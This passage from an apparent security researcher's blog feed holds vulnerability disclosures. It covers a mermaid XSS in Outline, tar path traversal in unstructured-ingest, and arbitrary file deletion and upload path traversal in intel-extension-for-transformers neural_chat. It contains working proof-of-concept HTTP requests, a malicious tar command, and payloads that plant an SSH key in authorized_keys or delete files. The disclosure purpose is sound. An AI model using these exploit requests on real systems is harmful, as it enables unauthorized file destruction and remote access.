 Class01 &lt;|-- `&lt;h1&gt;inject styles&lt;/h1&gt;&lt;style&gt;div{color:red!important;font-size:22px;}&lt;/style&gt;`
 Class01 : int gorilla
</code></pre></div>    </div>
    <p><img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87" /></p>
  </li>
  <li>
    <p>The poc can be found in <a href="https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140">this page</a>.</p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered.</p>

<h3 id="reference">Reference</h3>

<p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>

<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)</title><link href="http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured(Just Thanks)" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.14.3</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The unstructured ingest provide extra <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">sftp</code></a> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage"><code class="language-plaintext highlighter-rouge">gcs</code></a> modules to batch process all documents in remote cloud storages. The <a href="https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76"><code class="language-plaintext highlighter-rouge">process_compressed_doc</code></a> is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file.</p>

<p>Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10"><code class="language-plaintext highlighter-rouge">DocFactory.run</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262"><code class="language-plaintext highlighter-rouge">FsspecSourceConnector.get_ingest_docs</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83"><code class="language-plaintext highlighter-rouge">CompressionSourceConnectorMixin.process_compressed_doc</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33"><code class="language-plaintext highlighter-rouge">uncompress_file</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a>, The <code class="language-plaintext highlighter-rouge">uncompress_tar_file</code> calls <code class="language-plaintext highlighter-rouge">tarball.extractall</code> without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.</p>

<p>The <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extractall(path=path)
    return path
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>For simplicity, I use sftp ingest to batch process documents from a test sftp server.</p>

<p>First, let’s start a simple sftp server using docker from <a href="https://hub.docker.com/r/atmoz/sftp/"><code class="language-plaintext highlighter-rouge">atmoz/sftp</code></a>. The server is listen at my local network <code class="language-plaintext highlighter-rouge">10.15.0.5:2222</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
</code></pre></div></div>

<p>Next, create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, upload <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> to previously created sftp server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># login to sftp server, account: foo, password: pass
sftp -P 2222 foo@10.15.0.5

# cd into upload folder
sftp&gt; cd upload

# upload hack.tar.gz
sftp&gt; put hack.tar.gz
sftp&gt; ls -la
-rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
</code></pre></div></div>

<p>Install <code class="language-plaintext highlighter-rouge">structrue</code> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">structure[sftp]</code></a>(using python3.10):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install unstructured
pip install "unstructured[sftp]"
</code></pre></div></div>

<p>Using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp">python snippets</a> in offical document to fetch all documents from sftp server, note that with <code class="language-plaintext highlighter-rouge">uncompress=True</code> set, save as <code class="language-plaintext highlighter-rouge">unstructured_sftp.py</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from unstructured.ingest.interfaces import (
    PartitionConfig,
    ProcessorConfig,
    ReadConfig,
)
from unstructured.ingest.runner import SftpRunner

if __name__ == "__main__":
    runner = SftpRunner(
        processor_config=ProcessorConfig(
            verbose=True,
            output_dir="sftp-output",
            num_processes=2,
        ),
        read_config=ReadConfig(),
        partition_config=PartitionConfig(),
        connector_config=SimpleSftpConfig(
            access_config=SftpAccessConfig(
                username="foo",
                password="pass",
            ),
            remote_url="sftp://10.15.0.5:2222/upload",
            recursive=True,
            uncompress=True
        ),
    )
    runner.run()
</code></pre></div></div>

<p>Lauch the attack, the file <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> in local system is overwritten</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python unstructured_sftp.py

&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<p>Or just using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">unstructured-ingest sftp</code> shell command</a> with <code class="language-plaintext highlighter-rouge">--uncompress</code> enabled:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; unstructured-ingest \
  sftp \
  --remote-url sftp://10.15.0.5:2222/upload \
  --username "foo" \
  --password "pass" \
  --num-processes 2 \
  --recursive \
  --uncompress \
  --verbose


&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="platform">Platform</h2>

<p>I noticed the platform Data Ingestion Source Connectors also have <code class="language-plaintext highlighter-rouge">uncompress</code> option, For example:</p>

<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage">sftp-storage</a></p>

<p><img src="/assets/images/bughunter/unstructured/Source-SFTP.png" alt="sftp" /></p>

<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/google-cloud">google cloud storage</a></p>

<p><img src="/assets/images/bughunter/unstructured/Source-Google-Cloud.png" alt="gc" /></p>

<h2 id="fix">Fix</h2>

<p>Patch for <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16">uncompress_tar_file</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
    def extraction_filter(member, path):
        """Run tarfile.tar_filter, but raise the expected ValueError"""
        # This is only called if the current Python has tarfile filters
        try:
            return tarfile.tar_filter(member, path)
        except tarfile.FilterError as exc:
            raise ValueError(str(exc))
    
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extraction_filter = extraction_filter
        tfile.extractall(path=path)
    return path
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p>Version v1</p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83</a></p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66</a></p>

<p>Version V2</p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://localhost:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>v1.4.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598"><code class="language-plaintext highlighter-rouge">/v1/askdoc/delete_file</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">del_path</code> parameter which allows the deletion of arbitrary file. The <code class="language-plaintext highlighter-rouge">del_path</code> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">without sanitization</a> and then the file is deleted. An attacker can delete files behalf of current process.</p>

<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.delete("/v1/askdoc/delete_file")
async def delete_single_file(request: Request):
    """Delete file according to `del_path` and `knowledge_base_id`.

    `del_path`:
        - specific file path(e.g. /path/to/file.txt)
        - folder path(e.g. /path/to/folder)
        - "all_files": delete all files of this knowledge base
    """
    params = await request.json()
    del_path = params['del_path']
    ...
    # partially delete files/folders from the kb
    if delete_path.exists():
        # delete file
        if delete_path.is_file():
            try:
                delete_path.unlink()
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
                )
        # delete folder
        else:
            try:
                shutil.rmtree(delete_path)
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
                )
        return {"status": True}
    else:
        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>First, we create a test file at <code class="language-plaintext highlighter-rouge">/home/kali/test.txt</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# touch /home/kali/test.txt
kali@fc7d9ff6a411:/# ls /home/kali/test.txt
-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
</code></pre></div></div>

<p>Then we start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
</code></pre></div></div>

<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
</code></pre></div></div>

<p>Send follow post request to the server using burpsuite to delete single file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
</code></pre></div></div>

<p>The response indicates the file is deleted.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Content-Length: 15
Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 06:26:58 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

{"status":true}
</code></pre></div></div>

<p>We can verify the the file is deleted using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# ls /home/kali/test.txt
ls: cannot access '/home/kali/test.txt': No such file or directory
</code></pre></div></div>

<p>Delete a folder using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can delete any files and folders the service process could access.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>v1.4.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296"><code class="language-plaintext highlighter-rouge">/v1/askdoc/upload_files</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">file_paths</code> parameter which allows the uploading of arbitrary files. The <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42"><code class="language-plaintext highlighter-rouge">file_path</code></a> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">without sanitization</a> and the file content is writen to dest location. An attacker can upload and overwrite <strong>ANY</strong> file on the filesystem. This can lead to remote code execution in many different ways.</p>

<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/v1/askdoc/upload_files")
async def retrieval_add_files(request: Request,
                           files: List[UploadFile] = File(...),
                           file_paths: List[str] = Form(...),
                           knowledge_base_id: str = Form(...)):
    ...
    for file_path, file in zip(file_paths, files):
        filename = file.filename
        if '/' in filename:
            filename = filename.split('/')[-1]
        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
        user_id = request.client.host
        logger.info(f'[askdoc - upload_files] user id: {user_id}')

        path_prefix = get_path_prefix(kb_id, user_id)
        upload_path = path_prefix + '/upload_dir'
        persist_path = path_prefix + '/persist_dir'
        save_path = Path(upload_path) / file_path
        save_path.parent.mkdir(parents=True, exist_ok=True)

        # save file content to local disk
        await save_file_to_local_disk(save_path, file)
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the neural_chat service and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
</code></pre></div></div>

<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
</code></pre></div></div>

<p>Send follow post request to the server using burpsuite:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://10.15.0.5:8000/v1/askdoc/upload_files HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cookie: 
Connection: close
Content-Length: 409

------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="knowledge_base_id"

123
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="files"; filename="blob"
Content-Type: text/plain

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
------WebKitFormBoundaryvIlRA9q70krSRDb7
Content-Disposition: form-data; name="file_paths"

/home/kali/.ssh/authorized_keys
------WebKitFormBoundaryvIlRA9q70krSRDb7--
</code></pre></div></div>

<p>The response indicates error but the file is written successfully.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Content-Length: 39
